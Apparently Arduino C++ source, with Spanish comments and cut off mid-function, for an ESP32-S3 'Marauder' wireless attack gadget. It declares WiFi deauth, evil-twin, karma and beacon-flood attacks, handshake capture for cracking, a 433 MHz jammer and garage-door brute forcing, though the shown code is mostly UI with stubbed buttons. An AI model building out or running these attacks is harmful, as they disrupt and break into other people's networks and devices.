/*
 * ==============================================================================
 * MARAUDER ESP32-S3 — VERSIÓN REAL CON FUNCIONALIDADES COMPLETAS
 * ==============================================================================
 * INCLUYE:
 * - Captura de handshakes WiFi (PMKID, EAPOL, WPA handshake)
 * - Almacenamiento en SD (PCAP, logs JSON, war-drive data)
 * - CC1101: Sniffer 433MHz + jammer + clonación de señales simples
 * - GPS NEO-8M: War-driving con geolocalización de redes
 * - UI LVGL Refactorizada (v2.0)
 * ==============================================================================
 */


#include <Arduino.h>
#include <SPI.h>
#include <TFT_eSPI.h>
#include <lvgl.h>
#include <Ticker.h>
#include <TinyGPS++.h>
#include <HardwareSerial.h>
#include <WiFi.h>
#include <SD.h>
#include <FS.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "freertos/queue.h"
#include <esp_task_wdt.h>
#include <atomic>
#include <vector>
#include <map>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "mbedtls/sha256.h"
#include "esp_timer.h"
#include "esp_mac.h"
// Librerías opcionales — comenta si no las tienes instaladas
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>

// SQLite3 es opcional. Descomenta si tienes la librería instalada:
// #define HAS_SQLITE
#ifdef HAS_SQLITE
#include <sqlite3.h>
#endif
// ======================== CONFIGURACIÓN ========================
#define GPS_RX           18
#define BAT_ADC_PIN       4
#define BAT_DIVIDER_RATIO 2.0

#define SCR_W  320
#define SCR_H  240

// Pines SPI
#define SPI_MOSI  11
#define SPI_MISO  13
#define SPI_SCK   12
#define TFT_CS    10
#define TFT_DC     9
#define TFT_RST   14
#define TFT_BL    15
#define TOUCH_CS   7
#define SD_CS     48
#define CC1101_CS 40
#define NRF24_CS  39

// Colores Legacy (usados en módulos backend)
#define C_BG      0x1A1A2E
#define C_CARD    0x16213E
#define C_DARK_BL 0x0F3460
#define C_GOOD    0x00FF88
#define C_LOW     0xFF4444
#define C_TEXT    0xFFFFFF

// Colores compatibilidad legacy
#define C_ACCENT_CORAL  0xC97E7E
#define C_ACCENT_PEACH  0xD4A373
#define C_ACCENT_TURQ   0x52796F
#define C_ACCENT_PURPLE 0x7E6B8F
#define C_ERROR         C_LOW
#define C_WARN          0xFFD700

// ======================== ESTRUCTURAS DE DATOS ========================
enum EventType { EVT_GPS, EVT_BAT, EVT_STATUS, EVT_WIFI };

struct AppEvent {
    EventType type;
    int value;
    char msg[64];
};

struct GPSData {
    double lat = 0, lng = 0, alt = 0, speed = 0, heading = 0;
    int sats = 0;
    bool valid = false;
};

struct WiFiHandshake {
    uint8_t bssid[6];
    uint8_t station[6];
    uint32_t timestamp;
    uint8_t frame_type;  // 0=PMKID, 1=EAPOL-M1, 2=EAPOL-M2, 3=EAPOL-M3, 4=EAPOL-M4
    uint8_t data[256];
    uint16_t data_len;
    double gps_lat;
    double gps_lng;
    int rssi;
};

struct SubGHzSignal {
    uint32_t frequency;
    uint32_t timestamp;
    int rssi;
    uint8_t modulation;  // 0=ASK, 1=OOK, 2=FSK, 3=GFSK, 4=MSK
    uint32_t baud_rate;
    uint8_t raw_data[512];
    uint16_t data_len;
};

// [NEW] Estructuras para nuevas funcionalidades
struct TestFrameConfig {
    uint8_t frame_type;        // 0x00=Beacon, 0x00+0x04=ProbeReq, 0x00+0x08=Auth, etc.
    uint8_t subtype;           // Subtipo específico
    uint8_t* source_mac;       // MAC origen (de tus dispositivos de prueba)
    uint8_t* dest_mac;         // MAC destino (broadcast o AP específico)
    uint8_t* bssid;            // BSSID del AP objetivo
    uint16_t seq_control;      // Sequence control field
    uint8_t* ie_data;          // Information Elements (SSID, rates, etc.)
    uint16_t ie_len;           // Longitud de IEs
    uint32_t interval_ms;      // Intervalo entre transmisiones
    uint8_t channel;           // Canal WiFi (1-11)
    int8_t tx_power;           // Potencia de transmisión (0-20 dBm)
};

struct TrafficGenConfig {
    char ssid_prefix[32];      // Prefijo para SSIDs de prueba (ej: "TEST-AP-")
    uint8_t ssid_count;        // Número de SSIDs a generar (1-50 recomendado)
    uint16_t beacon_interval;  // Intervalo de beacon en TU (1024us por TU)
    uint8_t channel;           // Canal fijo o 0 para hopping
    uint32_t duration_sec;     // Duración total del test en segundos
    bool include_probe_resp;   // Incluir respuestas a probe requests
};

struct RFTestConfig {
    uint32_t frequency_hz;      // Frecuencia (ej: 433920000 para 433.92 MHz)
    uint8_t modulation;         // 0=ASK, 1=OOK, 2=FSK, 3=GFSK, 4=MSK
    uint32_t baud_rate;         // Tasa de símbolos
    int8_t tx_power_dbm;        // Potencia: -30 a +12 dBm (depende del módulo)
    uint8_t* test_pattern;      // Patrón de datos para transmisión
    uint16_t pattern_len;       // Longitud del patrón
    uint8_t repeat_count;       // Veces a repetir la transmisión
    uint32_t interval_ms;       // Intervalo entre repeticiones
};

enum class WPA2HandshakeState {
    IDLE,
    M1_RECEIVED,    // AP → Client: ANonce
    M2_SENT,        // Client → AP: SNonce + MIC
    M3_RECEIVED,    // AP → Client: GTK + MIC
    M4_SENT,        // Client → AP: Confirmation
    COMPLETE,
    FAILED
};

struct HandshakeTracker {
    uint8_t client_mac[6];
    uint8_t ap_bssid[6];
    WPA2HandshakeState state;
    uint8_t anonce[32];      // From M1
    uint8_t snonce[32];      // Generated for M2
    uint8_t mic_m2[16];      // MIC from M2 (for verification)
    uint8_t mic_m3[16];      // MIC from M3
    uint32_t replay_counter;
    uint32_t start_time;
    uint32_t completion_time;
    bool success;
};

struct NordicDevice {
    uint64_t address;           // Dirección de pipe (5 bytes típicamente)
    uint8_t channel;            // Canal RF (0-125)
    uint8_t payload_size;       // Tamaño de payload configurado
    uint8_t data_rate;          // 0=1Mbps, 1=2Mbps, 2=250kbps
    uint8_t last_seen;          // Timestamp relativo
    uint8_t packet_count;       // Paquetes observados
    uint8_t sample_payload[32]; // Último payload capturado
};

// ======================== CLASE MARAUDER ========================
class MarauderS3 {
private:
    lv_disp_draw_buf_t draw_buf;
    bool stylesDone = false;
    static lv_style_t s_screen, s_card, s_hero, s_title, s_value;
    
    void initStyles();
    lv_obj_t* createCard(lv_obj_t* parent, lv_coord_t w, lv_coord_t h);

public:
    lv_color_t *buf1 = nullptr, *buf2 = nullptr;

    TFT_eSPI tft = TFT_eSPI();
    TinyGPSPlus gps;
    HardwareSerial gpsSerial{2};

    // [NEW] Backend & Server
    AsyncWebServer* server = nullptr;
    DNSServer* dnsServer = nullptr;
#ifdef HAS_SQLITE
    sqlite3* db = nullptr;
#endif

    GPSData gpsData;
    float batVoltage = 0.0f;
    int batPercent = 0;
    std::atomic<int> activeModule{-1};

    SemaphoreHandle_t gpsMutex = nullptr;
    SemaphoreHandle_t spiMutex = nullptr;
    SemaphoreHandle_t sdMutex = nullptr;
    QueueHandle_t eventQueue = nullptr;

    // Core UI Objects
    lv_obj_t *toast_container = nullptr;
    lv_obj_t *lbl_toast = nullptr;
    lv_obj_t *list_wifi = nullptr;
    lv_obj_t *lbl_clock = nullptr;
    lv_obj_t *lbl_bat_pct = nullptr;
    
    // Legacy compat (used in SD init, deauth display)
    lv_obj_t *sdStatusLabel = nullptr;
    lv_obj_t *statusLabel = nullptr;
    
    // Buffers de captura
    std::vector<WiFiHandshake> capturedHandshakes;
    std::vector<SubGHzSignal> capturedSignals;
    std::map<String, int> wifiNetworksGPS;  // Mapeo GPS: MAC -> RSSI

    // Estado de módulos
    bool sdCardMounted = false;
    bool cc1101Ready = false;
    bool gpsFixed = false;
    int handshakeCount = 0;
    int deauthCount = 0;

    // Archivos SD
    File pcapFile;
    File jsonLogFile;
    File warDriveFile;
    String currentFileName;

    void begin();
    void buildUI();
    void processEvents();
    void showToast(const char* msg, uint32_t color);
    void clearWiFiScan() { WiFi.scanDelete(); }
    
    // FUNCIONES REALES
    bool initSDCard();
    void captureWiFiHandshake();
    void saveHandshakeToSD(WiFiHandshake& handshake);
    void exportToPCAP(WiFiHandshake& handshake);
    void logJSON(WiFiHandshake& handshake);
    void closeJSONLog();
    void warDriveLog();
    
    void initCC1101();
    void scan433MHz();
    void captureSubGHzSignal();
    void replaySignal(SubGHzSignal& signal);
    void bruteForceGarageDoors();
    
    void startDeauthAttack(int targetIndex);
    void stopDeauthAttack();
    void autoDeauthWeakSignals();
    
    void updateGPSUI();
    void updateBatteryUI();
    void updateWiFiUI();
    void refreshUiChrome();

    lv_obj_t *ui_top_bar = nullptr;

    // [NEW] Modern UI Structure
    lv_obj_t *screen_welcome = nullptr;
    lv_obj_t *main_content = nullptr;
    lv_obj_t *pages_container = nullptr;
    lv_obj_t *bottom_nav = nullptr;
    lv_obj_t *screen_nrf = nullptr;
    lv_obj_t *screen_storage = nullptr;
    lv_obj_t *screen_info = nullptr;
    
    // Status Bar Objects
    lv_obj_t *bat_fill = nullptr;
    lv_obj_t *theme_toggle = nullptr;
    
    // WiFi Page Objects
    lv_obj_t *wifi_status_badge = nullptr;
    lv_obj_t *networks_count_lbl = nullptr;
    lv_obj_t *handshake_count_lbl = nullptr;
    lv_obj_t *handshake_list_lbl = nullptr;
    
    // RF Page Objects
    lv_obj_t *rf_status_badge = nullptr;
    lv_obj_t *rf_spectrum_obj = nullptr;
    lv_obj_t *rf_packets_lbl = nullptr;
    lv_obj_t *rf_packets_list_lbl = nullptr;
    
    // NRF Page Objects
    lv_obj_t *nrf_status_badge = nullptr;
    lv_obj_t *nrf_devices_count_lbl = nullptr;
    lv_obj_t *nrf_devices_list_lbl = nullptr;
    
    // GPS Page Objects
    lv_obj_t *gps_fix_badge = nullptr;
    lv_obj_t *satellites_lbl = nullptr;
    lv_obj_t *latitude_lbl = nullptr;
    lv_obj_t *longitude_lbl = nullptr;
    lv_obj_t *speed_lbl = nullptr;
    lv_obj_t *wardriving_points_lbl = nullptr;
    
    // Storage Page Objects
    lv_obj_t *sd_status_badge = nullptr;
    lv_obj_t *auto_log_toggle = nullptr;
    lv_obj_t *total_handshakes_lbl = nullptr;
    lv_obj_t *total_rf_packets_lbl = nullptr;
    lv_obj_t *total_wd_points_lbl = nullptr;

    void buildWelcomeScreen();
    void buildStatusBar();
    void buildBottomNav();
    void buildWiFiPage(lv_obj_t* parent);
    void buildRFPage(lv_obj_t* parent);
    void buildNRFPage(lv_obj_t* parent);
    void buildGPSPage(lv_obj_t* parent);
    void buildStoragePage(lv_obj_t* parent);
    void buildInfoPage(lv_obj_t* parent);
    
    lv_disp_draw_buf_t* getDrawBuf() { return &draw_buf; }
    void setDrawBuf(lv_color_t* b1, lv_color_t* b2, uint32_t size) {
        lv_disp_draw_buf_init(&draw_buf, b1, b2, size);
    }
    
    // [NEW] 802.11 Frame Generator
    uint8_t* build80211ManagementFrame(const TestFrameConfig& cfg, uint16_t* out_len);
    esp_err_t transmitTestFrame(const TestFrameConfig& cfg);
    void logFrameTransmission(const TestFrameConfig& cfg, const uint8_t* frame, uint16_t len);

    // [NEW] Traffic Generator
    void startTrafficGeneration(const TrafficGenConfig& cfg);
    uint8_t* buildBeaconFrame(const char* ssid, uint16_t beacon_interval, uint16_t* out_len);
    void saveTrafficTestResults(const TrafficGenConfig& cfg, uint32_t frames_sent, uint32_t duration_ms);

    // [NEW] Client Simulator
    void startClientSimulation(const uint8_t* client_mac, const uint8_t* ap_bssid, 
                               const char* ssid, const char* password);
    static void eapolCaptureCallback(void* buf, wifi_promiscuous_pkt_type_t type);
    void processHandshakeEvents(HandshakeTracker& tracker);
    void updateHandshakeUI(HandshakeTracker& tracker);
    void logHandshakeResult(HandshakeTracker& tracker);
    void saveEAPOLFrame(uint8_t* frame, uint16_t len, uint8_t msg_num);
    void exportToHC22000(const HandshakeTracker& tracker, const char* ssid, const char* password);
    void setTemporaryMAC(const uint8_t* mac);

    // [NEW] CC1101 Test Engine
    bool configureCC1101ForTest(const RFTestConfig& cfg);
    bool transmitRFTestPattern(const RFTestConfig& cfg);
    uint8_t mapPowerToCC1101(int8_t dbm, uint32_t freq_hz);
    void writeCC1101Reg(uint8_t addr, uint8_t value);
    void strobeCC1101(uint8_t cmd);

    // [NEW] NRF24 Analyzer
    void scanNRF24Channels(uint8_t start_ch, uint8_t end_ch, uint16_t dwell_ms);
    NordicDevice captureNRF24Packet(uint8_t channel);
    bool initNRF24();
    void configureNRF24Channel(uint8_t channel);
    void setNRF24ModeRX();
    bool nrf24HasData();
    uint8_t readNRF24Payload(uint8_t* buffer, uint8_t max_len);
    uint8_t readNRF24Register(uint8_t reg);
    void configureNRF24Register(uint8_t reg, uint8_t value);
    void strobeNRF24(uint8_t cmd);
    uint64_t getNRF24RXAddress();
    uint8_t getNRF24DataRate();
    void saveNRF24ScanResults(std::vector<NordicDevice>& detected);

    // [NEW] Logging & Export
    char* bytesToHex(const uint8_t* data, uint16_t len, char* out_buf);
    void exportToPCAP_WithRadiotap(const uint8_t* frame, uint16_t len, int8_t rssi, uint8_t channel);
    void generateSummaryReport();

    // ==========================================
    // [ADVANCED] Funciones Solicitadas
    // ==========================================
    // WiFi
    void forcePMKID(uint8_t* bssid);
    void startEvilTwin(const char* ssid);
    void startKarmaAttack();
    void startBeaconFlood(bool useDictionary);
    
    // RF CC1101
    void decodeOOKASK(SubGHzSignal* signal);
    void toggleJammer(bool state, uint32_t freq_hz = 433920000);
    void sweepSpectrum(uint32_t startFreq, uint32_t endFreq);
    
    // Backend
    void initSQLite();
    void startAPIServer();
    void processRulesEngine();
    
    // UI
    void buildSpectrumUI();
};

MarauderS3 marauder;

// ======================== GLOBAL STATE ========================
bool is_light_theme = true;
int wifiNetworksCount = 0;

// Paletas Modernas (TFT 2.8" UI — Earthy Theme)
#define C_BG_LIGHT        0xCAD2C5
#define C_BG_DARK         0x2F3E46
#define C_SURFACE_LIGHT   0xFFFFFF
#define C_SURFACE_DARK    0x24343A
#define C_SURFACE2_LIGHT  0xF5F7F2
#define C_SURFACE2_DARK   0x1E2C31
#define C_SURFACE3_LIGHT  0xE8EDE4
#define C_SURFACE3_DARK   0x172428

#define C_BORDER_LIGHT    0xB8C4AA
#define C_BORDER_DARK     0x354F52
#define C_BORDER2_LIGHT   0xA4B494
#define C_BORDER2_DARK    0x45656A

#define C_TEXT_LIGHT      0x2F3E46
#define C_TEXT_DARK       0xCAD2C5
#define C_TEXT2_LIGHT     0x52796F
#define C_TEXT2_DARK      0x84A98C
#define C_TEXT3_LIGHT     0x84A98C
#define C_TEXT3_DARK      0x52796F

#ifndef C_ACCENT
#define C_ACCENT          0x52796F
#endif
#define C_ACCENT2         0x84A98C
#define C_DANGER          0xC97E7E
#define C_WARNING         0xD4A373
#define C_SUCCESS         0x84A98C

lv_style_t MarauderS3::s_screen, MarauderS3::s_card, MarauderS3::s_title, 
           MarauderS3::s_value, MarauderS3::s_hero;
static lv_style_t s_btn, s_btn_primary, s_btn_danger, s_btn_success, s_badge, s_toggle, s_nav_btn;

void MarauderS3::initStyles() {
    if (stylesDone) return;
    stylesDone = true;
    lv_style_init(&s_screen);
    lv_style_init(&s_card);
    lv_style_init(&s_title);
    lv_style_init(&s_value);
    lv_style_init(&s_hero);
    lv_style_init(&s_btn);
    lv_style_init(&s_btn_primary);
    lv_style_init(&s_btn_danger);
    lv_style_init(&s_btn_success);
    lv_style_init(&s_badge);
    lv_style_init(&s_toggle);
    lv_style_init(&s_nav_btn);
}

void applyTheme() {
    uint32_t bg_col = is_light_theme ? C_BG_LIGHT : C_BG_DARK;
    uint32_t surface_col = is_light_theme ? C_SURFACE_LIGHT : C_SURFACE_DARK;
    uint32_t text_col = is_light_theme ? C_TEXT_LIGHT : C_TEXT_DARK;
    uint32_t border_col = is_light_theme ? C_BORDER_LIGHT : C_BORDER_DARK;

    // Pantalla
    lv_style_set_bg_color(&MarauderS3::s_screen, lv_color_hex(bg_col));
    lv_style_set_text_color(&MarauderS3::s_screen, lv_color_hex(text_col));

    // Tarjeta
    lv_style_set_bg_color(&MarauderS3::s_card, lv_color_hex(surface_col));
    lv_style_set_bg_opa(&MarauderS3::s_card, LV_OPA_90);
    lv_style_set_radius(&MarauderS3::s_card, 10);
    lv_style_set_border_width(&MarauderS3::s_card, 1);
    lv_style_set_border_color(&MarauderS3::s_card, lv_color_hex(border_col));
    lv_style_set_pad_all(&MarauderS3::s_card, 8);
    lv_style_set_shadow_width(&MarauderS3::s_card, 0);

    // Botones
    lv_style_set_radius(&s_btn, 7);
    lv_style_set_pad_all(&s_btn, 4);
    lv_style_set_text_font(&s_btn, &lv_font_montserrat_10);
    
    // Botón Primario (Earthy Accent)
    lv_style_set_bg_color(&s_btn_primary, lv_color_hex(C_ACCENT));
    lv_style_set_text_color(&s_btn_primary, lv_color_hex(0xFFFFFF));
    
    // Botón Peligro
    lv_style_set_bg_color(&s_btn_danger, lv_color_hex(C_DANGER));
    lv_style_set_bg_opa(&s_btn_danger, LV_OPA_20);
    lv_style_set_text_color(&s_btn_danger, lv_color_hex(C_DANGER));
    lv_style_set_border_width(&s_btn_danger, 1);
    lv_style_set_border_color(&s_btn_danger, lv_color_hex(C_DANGER));

    // Botón Éxito
    lv_style_set_bg_color(&s_btn_success, lv_color_hex(C_SUCCESS));
    lv_style_set_bg_opa(&s_btn_success, LV_OPA_10);
    lv_style_set_text_color(&s_btn_success, lv_color_hex(C_SUCCESS));

    // Badge
    lv_style_set_radius(&s_badge, 12);
    lv_style_set_bg_color(&s_badge, lv_color_hex(C_ACCENT));
    lv_style_set_bg_opa(&s_badge, LV_OPA_10);
    lv_style_set_text_color(&s_badge, lv_color_hex(C_ACCENT));
    lv_style_set_text_font(&s_badge, &lv_font_montserrat_10);
    lv_style_set_pad_hor(&s_badge, 6);
    lv_style_set_pad_ver(&s_badge, 2);

    // Nav
    lv_style_set_bg_opa(&s_nav_btn, 0);
    lv_style_set_text_color(&s_nav_btn, lv_color_hex(is_light_theme ? C_TEXT2_LIGHT : C_TEXT2_DARK));
    lv_style_set_text_font(&s_nav_btn, &lv_font_montserrat_10);

    lv_obj_report_style_change(NULL);
}

lv_obj_t* MarauderS3::createCard(lv_obj_t* parent, lv_coord_t w, lv_coord_t h) {
    lv_obj_t* card = lv_obj_create(parent);
    lv_obj_set_size(card, w, h);
    lv_obj_add_style(card, &s_card, LV_PART_MAIN);
    lv_obj_clear_flag(card, LV_OBJ_FLAG_SCROLLABLE);
    return card;
}

// ─── NAV HELPERS ───
void anim_x_cb(void * var, int32_t v) { lv_obj_set_x((lv_obj_t*)var, v); }
void anim_y_cb(void * var, int32_t v) { lv_obj_set_y((lv_obj_t*)var, v); }
void anim_opa_cb(void * var, int32_t v) { lv_obj_set_style_bg_opa((lv_obj_t*)var, v, LV_PART_MAIN); }

#ifndef SIDE_MENU_W
#define SIDE_MENU_W 200
#endif
#define SIDE_MENU_X_OFF -(SIDE_MENU_W + 12)

// Legacy side-menu handler (kept for compatibility, no-op now)
static void btn_menu_toggle_event(lv_event_t * e) {
    // Side menu removed in new Earthy UI
}

static void theme_switch_event(lv_event_t* e) {
    lv_obj_t* sw = lv_event_get_target(e);
    is_light_theme = lv_obj_has_state(sw, LV_STATE_CHECKED);
    applyTheme();
}

// Legacy event handlers (kept as stubs for link-time compat)
static void btn_ward_toggle_event(lv_event_t* e) {
    // Wardriving now handled in GPS page
}

static void slider_cc1101_event(lv_event_t* e) {
    // CC1101 power now handled in RF page
}

static void style_hamburger_btn(lv_obj_t* b) {
    if (!b) return;
    lv_obj_set_style_bg_color(b, lv_color_hex(is_light_theme ? C_TEXT_LIGHT : C_TEXT_DARK), LV_PART_MAIN);
    lv_obj_set_style_bg_opa(b, LV_OPA_10, LV_PART_MAIN);
}

// ======================== CONSTRUIR UI ========================

void MarauderS3::showToast(const char* msg, uint32_t color) {
    if (!toast_container) return;
    lv_label_set_text(lbl_toast, msg);
    lv_obj_set_style_bg_color(toast_container, lv_color_hex(color), LV_PART_MAIN);
    
    lv_anim_t a;
    lv_anim_init(&a);
    lv_anim_set_var(&a, toast_container);
    lv_anim_set_time(&a, 400);
    lv_anim_set_custom_exec_cb(&a, anim_y_cb);
    lv_anim_set_values(&a, -50, 25);
    lv_anim_set_path_cb(&a, lv_anim_path_overshoot);
    lv_anim_start(&a);
    
    lv_anim_t a2;
    lv_anim_init(&a2);
    lv_anim_set_var(&a2, toast_container);
    lv_anim_set_time(&a2, 350);
    lv_anim_set_delay(&a2, 2400);
    lv_anim_set_custom_exec_cb(&a2, anim_y_cb);
    lv_anim_set_values(&a2, 25, -50);
    lv_anim_set_path_cb(&a2, lv_anim_path_ease_in);
    lv_anim_start(&a2);
}


static void btn_cap_event(lv_event_t * e) {
    MarauderS3* m = (MarauderS3*)lv_event_get_user_data(e);
    m->showToast("Capturando Red...", C_ACCENT);
    // Lógica para capturar handshake en la red seleccionada
}

// Helper para crear filas de ajustes
lv_obj_t* create_setting_row(lv_obj_t* parent, const char* label, const char* value = nullptr) {
    lv_obj_t* row = lv_obj_create(parent);
    lv_obj_set_size(row, LV_PCT(100), 24);
    lv_obj_set_style_bg_opa(row, 0, LV_PART_MAIN);
    lv_obj_set_style_border_side(row, LV_BORDER_SIDE_BOTTOM, LV_PART_MAIN);
    lv_obj_set_style_border_width(row, 1, LV_PART_MAIN);
    lv_obj_set_style_border_color(row, lv_color_hex(C_BORDER_LIGHT), LV_PART_MAIN);
    lv_obj_set_style_pad_all(row, 0, LV_PART_MAIN);
    lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t* lbl = lv_label_create(row);
    lv_label_set_text(lbl, label);
    lv_obj_set_style_text_font(lbl, &lv_font_montserrat_10, LV_PART_MAIN);
    lv_obj_set_style_text_color(lbl, lv_color_hex(C_TEXT2_LIGHT), LV_PART_MAIN);
    lv_obj_align(lbl, LV_ALIGN_LEFT_MID, 0, 0);

    if (value) {
        lv_obj_t* v_lbl = lv_label_create(row);
        lv_label_set_text(v_lbl, value);
        lv_obj_set_style_text_font(v_lbl, &lv_font_montserrat_10, LV_PART_MAIN);
        lv_obj_align(v_lbl, LV_ALIGN_RIGHT_MID, 0, 0);
        return v_lbl;
    }
    return row;
}

void MarauderS3::buildWiFiPage(lv_obj_t* parent) {
    lv_obj_t* page = lv_obj_create(parent);
    lv_obj_set_size(page, 320, 176);
    lv_obj_add_style(page, &s_screen, LV_PART_MAIN);
    lv_obj_set_style_pad_all(page, 6, LV_PART_MAIN);
    lv_obj_set_flex_flow(page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(page, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_STRETCH, LV_FLEX_ALIGN_START);

    lv_obj_t* card = createCard(page, LV_PCT(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_flow(card, LV_FLEX_FLOW_COLUMN);

    lv_obj_t* header = lv_obj_create(card);
    lv_obj_set_size(header, LV_PCT(100), 20);
    lv_obj_set_style_bg_opa(header, 0, LV_PART_MAIN);
    lv_obj_set_style_border_side(header, LV_BORDER_SIDE_BOTTOM, LV_PART_MAIN);
    lv_obj_set_style_border_width(header, 1, LV_PART_MAIN);
    lv_obj_set_style_pad_all(header, 0, LV_PART_MAIN);
    
    lv_obj_t* title = lv_label_create(header);
    lv_label_set_text(title, "📡 WiFi Security");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_12, LV_PART_MAIN);
    lv_obj_align(title, LV_ALIGN_LEFT_MID, 0, 0);

    wifi_status_badge = lv_label_create(header);
    lv_label_set_text(wifi_status_badge, "IDLE");
    lv_obj_add_style(wifi_status_badge, &s_badge, LV_PART_MAIN);
    lv_obj_align(wifi_status_badge, LV_ALIGN_RIGHT_MID, 0, 0);

    lv_obj_t* row1 = lv_obj_create(card);
    lv_obj_set_size(row1, LV_PCT(100), 30);
    lv_obj_set_style_bg_opa(row1, 0, LV_PART_MAIN);
    lv_obj_set_style_border_width(row1, 0, LV_PART_MAIN);
    lv_obj_set_flex_flow(row1, LV_FLEX_FLOW_ROW);
    lv_obj_set_style_pad_all(row1, 0, LV_PART_MAIN);
    lv_obj_set_style_pad_gap(row1, 4, LV_PART_MAIN);

    const char* btns1[] = {"Escanear", "Handshake", "PMKID"};
    for(int i=0; i<3; i++) {
        lv_obj_t* btn = lv_btn_create(row1);
        lv_obj_set_size(btn, 90, 24);
        lv_obj_add_style(btn, i==0 ? &s_btn_primary : &s_btn, LV_PART_MAIN);
        lv_obj_t* lbl = lv_label_create(btn);
        lv_label_set_text(lbl, btns1[i]);
        lv_obj_center(lbl);
        
        if(i==0) lv_obj_add_event_cb(btn, [](lv_event_t* e) {
             MarauderS3* m = (MarauderS3*)lv_event_get_user_data(e);
             m->showToast("Escaneando WiFi...", C_ACCENT);
             // wifiScan();
        }, LV_EVENT_CLICKED, this);
    }

    lv_obj_t* row2 = lv_obj_create(card);
    lv_obj_set_size(row2, LV_PCT(100), 30);
    lv_obj_set_style_bg_opa(row2, 0, LV_PART_MAIN);
    lv_obj_set_style_border_width(row2, 0, LV_PART_MAIN);
    lv_obj_set_flex_flow(row2, LV_FLEX_FLOW_ROW);
    lv_obj_set_style_pad_all(row2, 0, LV_PART_MAIN);
    lv_obj_set_style_pad_gap(row2, 4, LV_PART_MAIN);

    const char* btns2[] = {"Deauth", "Evil Twin", "Beacon", "Karma"};
    for(int i=0; i<4; i++) {
        lv_obj_t* btn = lv_btn_create(row2);
        lv_obj_set_size(btn, 66, 24);
        lv_obj_add_style(btn, i==0 ? &s_btn_danger : &s_btn, LV_PART_MAIN);
        lv_obj_t* lbl = lv_label_create(btn);
        lv_label_set_text(lbl, btns2[i]);
        lv_obj_center(lbl);
    }

    create_setting_row(card, "📋 Redes", "0");
    list_wifi = lv_obj_create(card);
    lv_obj_set_size(list_wifi, LV_PCT(100), 60);
    lv_obj_set_style_bg_opa(list_wifi, 0, LV_PART_MAIN);
    lv_obj_set_style_border_width(list_wifi, 0, LV_PART_MAIN);
    lv_obj_set_flex_flow(list_wifi, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_all(list_wifi, 0, LV_PART_MAIN);
}

void MarauderS3::buildRFPage(lv_obj_t* parent) {
    lv_obj_t* page = lv_obj_create(parent);
    lv_obj_set_size(page, 320, 176);
    lv_obj_set_pos(page, 0, 176);
    lv_obj_add_style(page, &s_screen, LV_PART_MAIN);
    lv_obj_set_style_pad_all(page, 6, LV_PART_MAIN);
    
    lv_obj_t* card = createCard(page, LV_PCT(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_flow(card, LV_FLEX_FLOW_COLUMN);

    lv_obj_t* header = lv_obj_create(card);
    lv_obj_set_size(header, LV_PCT(100), 20);
    lv_obj_set_style_bg_opa(header, 0, LV_PART_MAIN);
    lv_obj_set_style_border_side(header, LV_BORDER_SIDE_BOTTOM, LV_PART_MAIN);
    lv_obj_set_style_border_width(header, 1, LV_PART_MAIN);
    lv_obj_set_style_pad_all(header, 0, LV_PART_MAIN);
    
    lv_obj_t* title = lv_label_create(header);
    lv_label_set_text(title, "📻 CC1101 Sub-GHz");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_12, LV_PART_MAIN);
    lv_obj_align(title, LV_ALIGN_LEFT_MID, 0, 0);

    rf_status_badge = lv_label_create(header);
    lv_label_set_text(rf_status_badge, "STOP");
    lv_obj_add_style(rf_status_badge, &s_badge, LV_PART_MAIN);
    lv_obj_align(rf_status_badge, LV_ALIGN_RIGHT_MID, 0, 0);

    lv_obj_t* btn_grp = lv_obj_create(card);
    lv_obj_set_size(btn_grp, LV_PCT(100), 30);
    lv_obj_set_style_bg_opa(btn_grp, 0, LV_PART_MAIN);
    lv_obj_set_style_border_width(btn_grp, 0, LV_PART_MAIN);
    lv_obj_set_flex_flow(btn_grp, LV_FLEX_FLOW_ROW);
    lv_obj_set_style_pad_all(btn_grp, 0, LV_PART_MAIN);
    lv_obj_set_style_pad_gap(btn_grp, 4, LV_PART_MAIN);

    const char* btns[] = {"Sniffer", "Stop", "Garage BF", "Jammer"};
    for(int i=0; i<4; i++) {
        lv_obj_t* btn = lv_btn_create(btn_grp);
        lv_obj_set_size(btn, 66, 24);
        lv_obj_add_style(btn, i==0 ? &s_btn_primary : (i==3 ? &s_btn_danger : &s_btn), LV_PART_MAIN);
        lv_obj_t* lbl = lv_label_create(btn);
        lv_label_set_text(lbl, btns[i]);
        lv_obj_center(lbl);
        
        if(i==3) lv_obj_add_event_cb(btn, [](lv_event_t* e) {
             MarauderS3* m = (MarauderS3*)lv_event_get_user_data(e);
             static bool jam_on = false;
             jam_on = !jam_on;
             m->showToast(jam_on ? "🔥 Jammer ACTIVO" : "🛑 Jammer Detenido", jam_on ? C_DANGER : C_SUCCESS);
             lv_label_set_text(m->rf_status_badge, jam_on ? "JAMMING" : "STOP");
        }, LV_EVENT_CLICKED, this);
    }

    rf_spectrum_obj = lv_obj_create(card);
    lv_obj_set_size(rf_spectrum_obj, LV_PCT(100), 30);
    lv_obj_set_style_bg_opa(rf_spectrum_obj, 0, LV_PART_MAIN);
    lv_obj_set_style_border_width(rf_spectrum_obj, 0, LV_PART_MAIN);
    lv_obj_set_flex_flow(rf_spectrum_obj, LV_FLEX_FLOW_ROW);
    lv_obj_set_style_pad_all(rf_spectrum_obj, 0, LV_PART_MAIN);
    lv_obj_set_style_pad_gap(rf_spectrum_obj, 2, LV_PART_MAIN);
    lv_obj_set_flex_align(rf_spectrum_obj, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_END, LV_FLEX_ALIGN_START);

    for(int i=0; i<20; i++) {
        lv_obj_t* bar = lv_obj_create(rf_spectrum_obj);
        lv_obj_set_size(bar, 10, 5 + lv_rand(5, 20));
        lv_obj_set_style_bg_color(bar, lv_color_hex(C_ACCENT), LV_PART_MAIN);
        lv_obj_set_style_radius(bar, 2, LV_PART_MAIN);
        lv_obj_set_style_border_width(bar, 0, LV_PART_MAIN);
    }

